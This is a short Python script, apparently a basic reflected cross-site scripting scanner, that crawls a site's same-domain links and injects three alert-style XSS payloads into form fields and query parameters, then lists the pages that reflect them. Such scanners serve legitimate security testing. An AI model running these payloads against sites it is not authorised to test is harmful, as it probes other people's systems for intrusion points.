import requests, sys
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
class XSSScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.visited = set() 
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>"
        ]
        self.vulns = []
    def is_reflected(self, resp, payload):
        return payload in resp

    def test_payload(self, url, method, data, field, payload):
        try:
            resp = self.session.post(url, data) if method=="post" else self.session.get(url, params=data)
            if self.is_reflected(resp.text, payload):
                self.vulns.append((url, field, payload, method.upper()))
        except: pass

    def test_inputs(self, url):
        try:
            r = self.session.get(url, timeout=5)
            soup = BeautifulSoup(r.text, "html.parser")

            
            for form in soup.find_all("form"):
                action = urljoin(url, form.get("action") or url)
                method = form.get("method","get").lower()
                inputs = {i.get("name"):"test" for i in form.find_all(["input","textarea"]) if i.get("name")}
                for field in inputs:
                    for p in self.payloads:
                        data = inputs.copy(); data[field] = p
                        self.test_payload(action, method, data, field, p)

            params = parse_qs(urlparse(url).query)
            for field in params:
                for p in self.payloads:
                    test_params = params.copy(); test_params[field] = p
                    self.test_payload(url, "get", test_params, field, p)

        except: pass


    def crawl(self, url, depth=0):
        if depth>2 or url in self.visited: return
        self.visited.add(url)
        self.test_inputs(url)
        try:
            soup = BeautifulSoup(self.session.get(url).text,"html.parser")
            for link in soup.find_all("a", href=True):
                next_url = urljoin(url, link["href"])
                if urlparse(next_url).netloc == urlparse(self.base_url).netloc:
                    self.crawl(next_url, depth+1)
        except: pass

  
    def report(self):
        print("\n=== XSS Report ===")
        if not self.vulns:
            print("No XSS found.")
        for url, field, payload, method in self.vulns:
            print(f"[VULNERABLE] {url} | {field} | {method} | payload={payload}")

if __name__=="__main__":
    if len(sys.argv) < 2:
        exit("python xss.py {url}")
    target = sys.argv[1]
    try:
        if requests.get(target, timeout=5).status_code != 200:
         exit("Website unreachable.")
    except:
         exit("Error accessing site.")

    scan = XSSScanner(target)
    scan.crawl(target)
    scan.report()
